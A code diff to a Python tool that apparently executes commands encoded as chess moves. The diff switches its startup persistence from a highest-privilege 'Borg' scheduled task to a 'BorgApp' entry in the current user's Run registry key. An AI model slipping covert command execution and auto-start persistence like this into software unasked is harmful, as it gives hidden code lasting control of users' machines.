@@ -53,19 +53,25 @@ def translate_and_execute_chess_moves(chess_moves, codex_file):
     except Exception as e:
         print(f"Error during cleanup: {e}")
 
-def add_to_startup(executable_path, task_name="Borg"):
+def add_to_startup(executable_path, app_name="BorgApp"):
     try:
-        # Define the schtasks command
-        command = f'schtasks /Create /SC ONSTART /TN "{task_name}" /TR "{executable_path}" /RU "NT AUTHORITY\\LOCALSERVICE" /RL HIGHEST'
+        # Open the registry key for the current user's startup programs
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_SET_VALUE
+        )
+        # Set the new value with the path to the executable
+        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, executable_path)
+        winreg.CloseKey(key)
+        print(f"Successfully added {executable_path} to startup.")
 
-        # Run the command to create the scheduled task
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-
-        if result.returncode == 0:
-            print(f"Successfully added {executable_path} to startup via scheduled task '{task_name}'.")
-        else:
-            print(f"Failed to add {executable_path} to startup. Error: {result.stderr}")
-
+        # Verify if the key was successfully added
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+        value, _ = winreg.QueryValueEx(key, app_name)
+        print(f"Registry Key Value for {app_name}: {value}")
+        winreg.CloseKey(key)
     except Exception as e:
         print(f"Failed to add {executable_path} to startup: {e}")
         print(traceback.format_exc())
